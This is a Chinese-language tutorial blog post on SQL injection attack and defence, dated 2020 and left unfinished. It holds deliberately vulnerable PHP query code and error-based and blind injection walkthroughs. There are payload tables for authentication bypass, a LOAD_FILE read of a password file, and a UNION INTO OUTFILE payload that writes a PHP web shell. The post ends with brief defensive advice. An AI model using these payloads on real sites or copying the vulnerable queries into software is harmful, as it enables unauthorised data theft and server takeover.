@@ -1,0 +1,1261 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.29 with theme Tranquilpeak 0.4.1-BETA">
+    <title>sql注入攻防【未完结】</title>
+    <meta name="author" content="Frankie Wong">
+    <meta name="keywords" content="FreeKnight, duzhi5368, GameDev, IndieGame, Frankie, Blog, duzhi5368">
+
+    <link rel="icon" href="https://fafo4games.com/favicon.png">
+    
+
+    
+    <meta name="description" content="sql注入之前做的一些整理，和modsecurity一样，都是之前整理未完成的，因为已经熟悉了解就没有兴趣继续写下去了。权当备份。
+
+">
+    <meta property="og:description" content="sql注入之前做的一些整理，和modsecurity一样，都是之前整理未完成的，因为已经熟悉了解就没有兴趣继续写下去了。权当备份。
+
+">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="sql注入攻防【未完结】">
+    <meta property="og:url" content="/2020/03/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93/">
+    <meta property="og:site_name" content="The lost island">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="The lost island">
+    <meta name="twitter:description" content="sql注入之前做的一些整理，和modsecurity一样，都是之前整理未完成的，因为已经熟悉了解就没有兴趣继续写下去了。权当备份。
+
+">
+    
+      <meta name="twitter:creator" content="@duzhi5368">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/04ac3b6c0ab5e7f256a7ed05871e69e5?s=640">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://fafo4games.com/css/style-fpbzgxsy0kgmdvyrj5ykkg6ratccrk3gocmaqn4xpcjywmv5dteilzucro4f.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://fafo4games.com/">The lost island</a>
+  </div>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://fafo4games.com/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/04ac3b6c0ab5e7f256a7ed05871e69e5?s=110" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Frankie Wong</h4>
+        
+          <h5 class="sidebar-profile-bio">Ever tried, ever failed, fail better.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://fafo4games.com/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://fafo4games.com/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://fafo4games.com/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://fafo4games.com/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/OLDPAGE/index.html" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">OldPage</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/duzhi5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.facebook.com/FreeKnight5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook-official"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.linkedin.com/in/freeknight/" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
+      
+      <span class="sidebar-button-desc">LinkedIn</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://fafo4games.com/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      sql注入攻防【未完结】
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2020-03-21T00:00:00Z">
+        
+  三月 21, 2020
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://fafo4games.com/categories/%e9%bb%91%e5%ae%a2">黑客</a>, 
+    
+      <a class="category-link" href="https://fafo4games.com/categories/2020">2020</a>
+    
+  
+
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>sql注入之前做的一些整理，和modsecurity一样，都是之前整理未完成的，因为已经熟悉了解就没有兴趣继续写下去了。权当备份。</p>
+
+<p></p>
+
+<h2 id="理解sql注入">理解SQL注入</h2>
+
+<h4 id="漏洞占比">漏洞占比</h4>
+
+<p>根据OWASP（Open Web Application Security Project）的分析，网络中10大应用系统安全弱点如下：</p>
+
+<pre><code>1. Injection flaws，注入，特别是SQL注入是核心中的核心。当然还有OS诸如，LDAP注入等。
+
+2. Broken Authentication，失效的身份验证和会话管理。例如破解密码，劫持会话TOKEN等方式冒充用户身份。
+
+3. Sensitive Data Exposure，敏感资料外泄。部分Web应用和API无法正确保护敏感数据。导致攻击者获取未加密的财务资料，用户个人资料等。
+
+4. XML External Entities (XXE) 外部实体漏洞。部分早期的XML处理器存在对XML文件中的外部实体引用的错误处理。会在windows服务器上实现文件共享，内部端口扫描，远程代码执行等方式来实时DDOS攻击。
+
+5. Broken Access Control 无效的存取访问权限。未对通过身份验证的用户实施恰当的访问控制，导致攻击者可以访问未授权的功能或数据，例如修改其他用户数据，查看敏感文件等。
+
+6. Security Misconﬁguration 安全配置错误。例如使用了不安全的默认配置，不正确的HTTP标头，包含了敏感信息的错误信息，不升级系统,框架,组件等。
+
+7. Cross-Site Scripting（XSS) 跨站脚本。当用用程序网页中包含不受信任或错误转义的数据，就可能出现XSS缺陷。该缺陷会导致攻击者可以在受害者浏览器中执行脚本，以达到劫持用户对话，污染网站，重定义用户到恶意网站的效果。
+
+8. Insecure Deserialization 反序列化漏洞。当收到恶意的反序列对象时，会出现不安全的反序列缺陷，导致恶意代码执行。
+
+9. Using Components with  Known Vulnerabilities 使用了含有已知漏洞的组件。组件运行权限一般和应用程序相同，如有已知含有漏洞的组件，也会导致服务器遭受攻击。
+
+10. Insufﬁcient Logging &amp; Monitoring 记录和监控不足。
+
+</code></pre>
+
+<h4 id="网络架构">网络架构</h4>
+
+<pre><code>三层架构：
+
+前端呈现HTML &lt;-- 逻辑层发送HTML到前端 &lt;-- 数据库
+
+四层架构
+
+前端呈现HTML &lt;-- 逻辑层发送HTML到前端（C#,ASP,.net,PHP,JSP等） &lt;-- 应用层为web服务提供数据（Web服务） &lt;-- 数据库
+</code></pre>
+
+<h4 id="sql注入">SQL注入</h4>
+
+<p>SQL注入是将SQL代码插入或添加到用户输入参数中，然后将该参数传递给后台的SQL服务器加以解析并执行的攻击。</p>
+
+<p>一旦攻击成功，攻击者将拥有对数据库服务器访问的权限，通常权限很高。</p>
+
+<p>其产生原因，就是Web应用开发人员无法确保从Web表单, cookie, 输入参数等收到的值进行验证，而直接传递给了SQL查询，就会出现SQL注入漏洞。</p>
+
+<h4 id="简单的例子">简单的例子</h4>
+
+<p>login.php</p>
+
+<pre><code>// 连接数据库
+$connect = mysql_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;)
+// 动态创建SQL语句
+$query =    &quot;SELECT userid FROM Users WHERE user = '$_GET[&quot;user&quot;]' &quot; .
+            &quot;AND password = '$_GET[&quot;password&quot;]'&quot;;
+// 查询数据库
+$result = mysql_query($query);
+</code></pre>
+
+<p>我们期望用户输入账号 foo, 密码 testpassword，于是我们组装得到如下的SQL</p>
+
+<pre><code>SELECT userid FROM Users WHERE user = 'foo' AND password = 'testpassword'
+</code></pre>
+
+<p>但是用户恶意输入的密码是 ** idontknow&rsquo; OR &lsquo;1&rsquo; = &lsquo;1&rsquo; ** ，导致我们组装得到的SQL成为</p>
+
+<pre><code>SELECT userid FROM Users WHERE user = 'foo' AND password = 'idontknow' OR '1' = '1'
+</code></pre>
+
+<p>后果就是，将 Users 表内全部的userid返回了。</p>
+
+<h4 id="burp-suite本地代理">Burp suite本地代理</h4>
+
+<p>我们大部分时间，并不需要去管前端显示，直接模拟请求就好。</p>
+
+<p>对于GET请求很容易处理，直接修改参数即可，如下即可</p>
+
+<pre><code>http://xxoo.com/search.aspx?user='foo'&amp;password='idontknow&quot; OR &quot;1&quot; = &quot;1&quot;'
+</code></pre>
+
+<p>但POST请求并不这么容易查看数据，此时可以使用浏览器的 web developer 扩展插件，或者直接设置本地代理。</p>
+
+<p>这里推荐后者。</p>
+
+<p>本地代理就是对浏览器进行设置，修改代理选项，指向本地的代理软件，例如 Burp suite，然后所有的网络请求将会通过 Burp suite 转发到目标服务器，在这个过程中，我们可以通过软件截获POST消息，进行字段修改后再进行发送。</p>
+
+<h2 id="常见sql错误">常见SQL错误</h2>
+
+<p>我们尝试进行SQL注入时，Web服务器可以做出很多反映，例如参数检查处理，查询错误结果的二次处理等。</p>
+
+<p>当然，对我们而言，最好的情况是应用返回了完整的SQL错误，不过这种情况比较少见，但我们需要了解。</p>
+
+<h4 id="转义字符处理不当">转义字符处理不当</h4>
+
+<p>例如：</p>
+
+<pre><code>    $SQL = &quot;SELECT * FROM table WHERE field = '$_GET[&quot;input&quot;]'&quot;;
+</code></pre>
+
+<p>如果我们传入特殊字符，则会导致SQL做出错误处理。</p>
+
+<p>特殊字符，</p>
+
+<ul>
+<li>空格</li>
+<li>管道字符 |</li>
+<li>单引号 &lsquo;</li>
+<li>双竖线 ||</li>
+<li>逗号 ,</li>
+<li>点号 .</li>
+<li>注释符号 /* 或 */</li>
+<li>双引号 &ldquo;</li>
+<li>且运算符 &amp;</li>
+<li>模糊查询符号 %</li>
+<li>通配符 *</li>
+<li>变量定义符 @</li>
+<li>双横注释符号 &ndash;</li>
+<li>井号注释符 #</li>
+<li>括号 ( 或 )</li>
+<li>中括号 [ 或 ]</li>
+<li>大于号小于号 &lt; &gt;</li>
+<li>16进制注入符 0x</li>
+</ul>
+
+<p>其他敏感字符，例如</p>
+
+<ul>
+<li>横线 -</li>
+<li>问号 ?</li>
+<li>斜杠 /</li>
+<li>分号 ;</li>
+<li>回车符 \r\n</li>
+<li>金钱符 $</li>
+</ul>
+
+<p>数据库关键词，例如，</p>
+
+<ul>
+<li>delete</li>
+<li>select</li>
+<li>update</li>
+<li>insert</li>
+<li>count</li>
+<li>drop</li>
+<li>truncate</li>
+<li>asc</li>
+<li>char</li>
+<li>chr</li>
+<li>and</li>
+<li>or</li>
+<li>net</li>
+<li>union</li>
+<li>having</li>
+<li>存储过程命令关键字 Exec 或 Execute</li>
+<li>系统存储过程关键字 xp_ 或 sp_</li>
+</ul>
+
+<p>语言关键词，例如</p>
+
+<ul>
+<li>mid</li>
+<li>ascii</li>
+<li>left</li>
+<li>greatest</li>
+<li>least</li>
+<li>substr</li>
+<li>sleep</li>
+<li>benchmark</li>
+<li>regexp</li>
+<li>if</li>
+</ul>
+
+<h4 id="类型检查不当">类型检查不当</h4>
+
+<p>例如：我们本能以为userid是一个数字</p>
+
+<pre><code>    $SQL = &quot;SELECT * FROM table WHERE field = $_GET[&quot;userid&quot;]&quot;;
+</code></pre>
+
+<p>此时，userid如果传入</p>
+
+<pre><code>    1 UNION ALL SELECT LOAD_FILE('etc/password') --
+</code></pre>
+
+<p>那么攻击者就可以获得系统用户的属性和用户名</p>
+
+<p>如果userid传入</p>
+
+<pre><code>    1 UNION SELECT &quot;&lt;? system($_REQUEST['cmd']); ?&gt;&quot; INTO OUTFILE &quot;/var/www/html/xxoo.com/shell.php&quot; -
+</code></pre>
+
+<p>这样就可以创建一个shell脚本，通常该脚本会有远程交互访问能力。</p>
+
+<h4 id="查询语句组装不当">查询语句组装不当</h4>
+
+<p>例如，我们组建这样一个语句</p>
+
+<pre><code>    $SQL = &quot;SELECT&quot; . $_GET[&quot;column1&quot;] . &quot;,&quot; . $_GET[&quot;column2&quot;] . &quot;,&quot; . $_GET[&quot;column3&quot;] . &quot;FROM&quot; . $_GET[&quot;table&quot;];
+</code></pre>
+
+<p>那么用户穿参可能是</p>
+
+<pre><code>    http://xxoo.com/ooxx.php?table=users&amp;column1=user&amp;column2=password&amp;column3=Super_priv
+</code></pre>
+
+<p>这样，攻击者将获得账号密码数据。</p>
+
+<h4 id="错误处理不当">错误处理不当</h4>
+
+<p>我们很多时候会将详细的内部错误返回给用户，例如数据库错误，错误代码等。这些错误细节将泄漏内部实现线索。</p>
+
+<p>例如攻击者传入类似的参数</p>
+
+<pre><code>     XXOO' and 1 in (SELECT @@version) -
+</code></pre>
+
+<p>将可能得到如下信息</p>
+
+<pre><code>    [Microsoft] [ODBC SQL server driver] [SQL Server] Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.534 (Inter X86) Nov 19 2001 13:23:50 Copyright(c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0(Build 2195: Server pack 3)' to a column of data type int.
+</code></pre>
+
+<p>上面其实就是数据库报错，无法把字符串转成整形。</p>
+
+<p>其中已经暴露了服务器和数据库版本信息。</p>
+
+<h4 id="默认数据库账户">默认数据库账户</h4>
+
+<p>例如SQLServer的 sa 系统管理员账户。MySQL的 root 和 anonymous 用户账户，Oracle创建数据库时默认创建的 SYS, SYSTEM, DBSNMP 和 OUTLN 账户。</p>
+
+<h4 id="账户权限权限问题">账户权限权限问题</h4>
+
+<p>例如账号是否支持 xp_cmdshell, OPENROWSET, LOAD_FILE, ActiveX等。</p>
+
+<h4 id="数据库元数据">数据库元数据</h4>
+
+<p>例如MySQL中的 INFORMATION_SCHEMA 虚拟数据库，必定存在且允许全部MySQL用户访问，可以查看表名行信息等。</p>
+
+<p>SQL Server和MySQL类似。</p>
+
+<p>Oracle则是有 ALL_TABLES, ALL_TAB_COLUMNS 等元数据。</p>
+
+<p>例如，我们想知道某用户当前可以访问的权限</p>
+
+<pre><code>    -- Oracle，列举当前用户，可访问的全部表
+    SELECT OWNER, TABLE_NAME FROM ALL_TABLES;
+    -- MySQL，列举当前用户可访问的所有表和数据库 (三种方式)
+    SELECT tabel_schema, table_name FROM information_schema.tables;
+    SELECT name FROM sysobjects WHERE xtype='U';
+    SELECT name FROM sys.tables;
+</code></pre>
+
+<h4 id="错误信息利用过程">错误信息利用过程</h4>
+
+<p>例1：</p>
+
+<pre><code>    我们监视到一个请求 [该请求用来查看球类物品的商品列表]
+    http://xxoo.com/showproducts.aspx?category=ball 
+    我们修改请求：
+    http://xxoo.com/showproducts.aspx?category=attacker'
+    返回错误为：
+    Server Error in '/' application.
+    Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string 'attacker;'.
+</code></pre>
+
+<p>我们可以猜测SQL代码为</p>
+
+<pre><code>    SELECT * FROM tableXX WHERE category='attacker''
+</code></pre>
+
+<p>后面多了个单引号，导致DB拒绝语句并返回错误。</p>
+
+<p>这就证明了，Web后端服务器没有对参数中的 &lsquo; 单引号做额外消除处理。</p>
+
+<p>例2：</p>
+
+<pre><code>    我们监视到一个请求 [该请求用来查看一个id名叫2的物品的商品]
+    http://xxoo.com/showproduct.aspx?id=2
+    我们修改请求：
+    http://xxoo.com/showproduct.aspx?id=attacker
+    返回错误为：
+    Server Error in '/' application.
+    Exception Details: System.Data.SqlClient.SqlException: Invalid column name 'acttacker'.
+</code></pre>
+
+<p>我们可以猜测SQL代码为</p>
+
+<pre><code>    SELECT * FROM tableXX WHERE idproduct=attacker
+</code></pre>
+
+<p>参数 attacker 和 2 必然是一个列名。</p>
+
+<p>例3，利用错误获取数据库信息</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' and 1=0/@@version; --
+    返回错误为：
+    Server Error in '/' application.
+    Syntax error converting the nvarchar value 'Microsoft SQL Server 2000 - 8.00.534 (Inter X86) Nov 19 2001 13:23:50 Copyright(c) 1988-2000 Microsoft Corporation Enterprise Edition on Windows NT 5.0(Build 2195: Server pack 3)' to a column of data type int.
+</code></pre>
+
+<p>它将@@version的结果，尝试转换为int，失败，于是做出提示。其中 0/@@version 做为注入代码。</p>
+
+<p>例4，利用错误获取内容信息</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' and 1=0/user; --
+    返回错误为：
+    Syntax error converting the nvarchar value 'frank' to a column of data type int.
+</code></pre>
+
+<p>利用的方式和上面一样，但顺利的返回了user的变量为 frank</p>
+
+<p>例5，利用错误信息获取表名字段名</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' having 1'='1;
+    返回错误为：
+    Server Error in '/' application.
+    Column 'products.productid' is invalid in the select list because it is not contained in an aggregate function and this is no GROUP BY clause.
+</code></pre>
+
+<p>于是，攻击者拿到了 products.productid 表名和字段名。</p>
+
+<p>例6，我们进一步</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' GROUP BY productid having '1'='1'
+    返回错误为：
+    Server Error in '/' application.
+    Column 'products.name' is invalid in the select list because it is not contained in either an aggregate function and this is no GROUP BY clause.
+</code></pre>
+
+<p>这样，我们用之前得到的 productid 列，就可以得到 name 列，再进一步</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' GROUP BY productid, name having '1'='1'
+    返回错误为：
+    Server Error in '/' application.
+    Column 'products.price' is invalid in the select list because it is not contained in either an aggregate function and this is no GROUP BY clause.
+</code></pre>
+
+<p>我们又得到了 price 字段。这样一步步可以得到products表的全部列。再用例4样例</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?category=ball' and 1=0/name; --
+    返回错误为：
+    Syntax error converting the nvarchar value 'XX basketball' to a column of data type int.
+</code></pre>
+
+<p>获取列值。</p>
+
+<p>当然，这样也可能可以获得用户名和密码。</p>
+
+<p>而且进一步，还可以对得到的数据做排除。</p>
+
+<p>例7：</p>
+
+<pre><code>    http://xxoo.com/showproduct.aspx?username=frank' and User not in ('Admin') and 1 = 0/User and 1'='1
+</code></pre>
+
+<p>这样就排除了已经获取的列数据值，得到其他的新的列数据。</p>
+
+<h4 id="sql注入观察">SQL注入观察</h4>
+
+<p>如果再不做额外处理时，尝试SQL注入后，如果返回HTTP 500 或者 HTTP 302响应，虽然得不到具体信息，但依然可以确定我们的SQL注入获得了接收。</p>
+
+<p>此时任何一个SQL注入后，有任何的界面元素的更变，即使没有任何有用的信息，都值得我们进一步尝试。</p>
+
+<p>此时我们就依赖于SQL盲注。</p>
+
+<h4 id="sql盲注简介">SQL盲注简介</h4>
+
+<p>例1: 我们给一个登录Form填写账号和密码均为</p>
+
+<pre><code>    user' or '1'='1
+</code></pre>
+
+<p>结果得到错误信息 Invalid password（密码错误）</p>
+
+<p>填写账号和密码均为</p>
+
+<pre><code>    user' and '1'='2
+</code></pre>
+
+<p>得到错误信息 Invalid username or password（账号或密码错误）</p>
+
+<p>我们可以确定username字段易受到SQL注入攻击，但password则不会受到SQL注入攻击。</p>
+
+<p>例2: 我们假设有个网站正常请求如下</p>
+
+<p><a href="http://xxoo.com/showproduct.php?id=1">http://xxoo.com/showproduct.php?id=1</a>
+<a href="http://xxoo.com/showproduct.php?id=2">http://xxoo.com/showproduct.php?id=2</a></p>
+
+<p>上述请求将显示商品的详细信息。我们进行测试</p>
+
+<p><a href="http://xxoo.com/showproduct.php?id=attack">http://xxoo.com/showproduct.php?id=attack</a>
+<a href="http://xxoo.com/showproduct.php?id=-1">http://xxoo.com/showproduct.php?id=-1</a>
+<a href="http://xxoo.com/showproduct.php?id=99999999999">http://xxoo.com/showproduct.php?id=99999999999</a>
+<a href="http://xxoo.com/showproduct.php?id=attack'">http://xxoo.com/showproduct.php?id=attack'</a></p>
+
+<p>结果都返回第一件商品信息或者某个错误页面或者302，那么说明后台做了一些安全监测。</p>
+
+<p>我们继续</p>
+
+<p><a href="http://xxoo.com/showproduct.php?id=5-1">http://xxoo.com/showproduct.php?id=5-1</a>
+<a href="http://xxoo.com/showproduct.php?id=1+3">http://xxoo.com/showproduct.php?id=1+3</a></p>
+
+<p>结果真的得到了id=4的商品信息。那么我们做URL编码测试</p>
+
+<p><a href="http://xxoo.com/showproduct.php?id=1%2B3">http://xxoo.com/showproduct.php?id=1%2B3</a>
+<a href="http://xxoo.com/showproduct.php?id=2%2B2">http://xxoo.com/showproduct.php?id=2%2B2</a></p>
+
+<p>%2B在URL编码中为 加号，是URL的保留字。我们看看情况，再测试</p>
+
+<p><a href="http://xxoo.com/showproduct.php?id=1">http://xxoo.com/showproduct.php?id=1</a> or 1=1
+<a href="http://xxoo.com/showproduct.php?id=1">http://xxoo.com/showproduct.php?id=1</a> or 1=2
+<a href="http://xxoo.com/showproduct.php?id=1">http://xxoo.com/showproduct.php?id=1</a> and 1=1
+<a href="http://xxoo.com/showproduct.php?id=1">http://xxoo.com/showproduct.php?id=1</a> and 1=2</p>
+
+<p>这些行为就是SQL盲注，去判断不同的请求，是否能对后端响应造成任何干扰响应。</p>
+
+<p>当然，这些行为数量很大，都是自动化进行，无需人工手动执行。</p>
+
+<h2 id="sql注入类型">SQL注入类型</h2>
+
+<h3 id="内联sql注入">内联SQL注入</h3>
+
+<p>即，将一些额外代码添加到原本的查询语句中，原语句依然可以正常执行。</p>
+
+<h4 id="字符串内联注入">字符串内联注入</h4>
+
+<pre><code>    假设语句为
+    SELECT * FROM users WHERE username = '[USER INPUT]' AND password = '[USER INPUT]'
+    注入语句
+    SELECT * FROM users WHERE username = '' OR (1=1) OR '1'='1' AND password = ''
+    因为在SQL中，逻辑运算符AND比OR高，所以上述语句等同于
+    SELECT * FROM users WHERE (username = '') OR (1=1) OR ('1'='1' AND password = '')
+    WHERE后条件为全真，即可得到user全表数据
+</code></pre>
+
+<p>字符内联注入常用特征值</p>
+
+<pre><code>    字符串             变种                  期望结果
+    '                                       返回一个错误
+    1' or '1'='1        1') or ('1'='1      永真条件。返回表内所有行。
+    value' or '1'='2    value') or ('1'='2  空条件。返回正常结果。
+    1' and '1'='2       1') and ('1'='2     永假条件。不返回任何数据。
+    1' or 'ab'='a'+'b   1') or ('ab'='a'+'b SQLServer字符串连接
+    1' or 'ab'='a' 'b   1') or ('ab'='a' 'b MySQL字符串连接
+    1' or 'ab'='a'||'b  1') or ('ab'='a'||'b Oracle字符串连接
+</code></pre>
+
+<h4 id="数字值内联注入">数字值内联注入</h4>
+
+<pre><code>    假设语句为
+    SELECT * FROM message WHERE id = [USER INPUT] ORDED BY received;
+    注入后语句为
+    SELECT * FROM message WHERE id = 45 OR 1=1 ORDED BY received;
+    即可得到全部数据
+</code></pre>
+
+<p>数字内联注入常用特征值</p>
+
+<pre><code>    字符串             变种                  期望结果
+    '                                       返回一个错误
+    1+1                 3-1                 返回正常数据。
+    value + 0                               返回正常数据。
+    1 or 1=1            1&gt; or (1=1          永真条件。返回表内全部行
+    value or 1=2        value) or (1=2      空条件。返回正常结果。
+    1 and 1=2           1) and (1=2         永假条件。不返回任何数据。
+    1 or 'ab'='a'+'b'   1) or ('ab'='a'+'b' SQLServer字符串连接
+    1 or 'ab'='a' 'b'   1) or ('ab'='a' 'b' MySQL字符串连接
+    1 or 'ab'='a'||'b'  1) or ('ab'='a'||'b' Oracle字符串连接
+</code></pre>
+
+<h3 id="终止sql注入">终止SQL注入</h3>
+
+<h4 id="数据库注释语法">数据库注释语法</h4>
+
+<pre><code>    数据库类型                       注释
+    SQLServer/Oracle/PostgreSQL     -- 或 /**/
+    MySQL                           -- 或 # 或 /**/
+</code></pre>
+
+<p>例1：</p>
+
+<pre><code>    假设语句为
+    SELECT * FROM users WHERE username = '[USER INPUT]' AND password = '[USER INPUT]'
+    注入语句
+    SELECT * FROM users WHERE username = '' OR 1=1;-- AND password = '';
+    其中1=1为永真，而password检查被直接注释掉了，所以返回users内全部行。
+</code></pre>
+
+<p>例2：</p>
+
+<pre><code>    假设语句为
+    SELECT * FROM users WHERE username = '[USER INPUT]' AND password = '[USER INPUT]'
+    注入语句
+    SELECT * FROM users WHERE username = 'admin'/*' AND password = ' */'';
+    这样将直接跳过密码检查
+</code></pre>
+
+<p>注释语法注入常用特征值</p>
+
+<pre><code>    字符串             变种                  期望结果
+    admin'--            admin')--           绕开身份验证机制
+    admin'#             admin')#            MySQL中绕开身份验证机制
+    1--                 1)--                清除注入参数后的全部WHERE过滤器
+    1 or 1=1--          1) or 1=1--         注入一个数字参数，返回全部行数据
+    ' or '1'='1'--      ') or '1'='1'--     注入一个字符串参数，返回全部行数据
+    1/*注释*/                             返回正常数据，用来识别SQL注入漏洞
+</code></pre>
+
+<h2 id="建议">建议</h2>
+
+<h4 id="使用白名单">使用白名单</h4>
+
+<p>尽量使用允许输入的字符列表的白名单，而非使用字符过滤的黑名单。</p>
+
+<p>因为现实中存在非常多的攻击类型，它们能以多种形式呈现，想要维护这样一个禁止列表是非常繁重的任务。</p>
+
+<h4 id="隐藏错误信息">隐藏错误信息</h4>
+
+<p>尽可能隐藏SQL错误，不要使用户可见。</p>
+
+<ul>
+<li>避免字符串提示</li>
+<li>错误时可以跳转到另一页面</li>
+<li>错误时返回HTTP 500内部服务器错误，或者重定向302</li>
+<li>返回一个通用的错误页面</li>
+</ul>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://fafo4games.com/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://fafo4games.com/2020/03/modsecurity%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%E6%9C%AA%E5%AE%8C%E7%BB%93/" data-tooltip="ModSecurity网络安全防御策略【未完结】">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://fafo4games.com/2020/02/%E6%9C%88%E8%AE%B0202002/" data-tooltip="月记202002">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://fafo4games.com/2020/03/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E6%9C%AA%E5%AE%8C%E7%BB%93/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
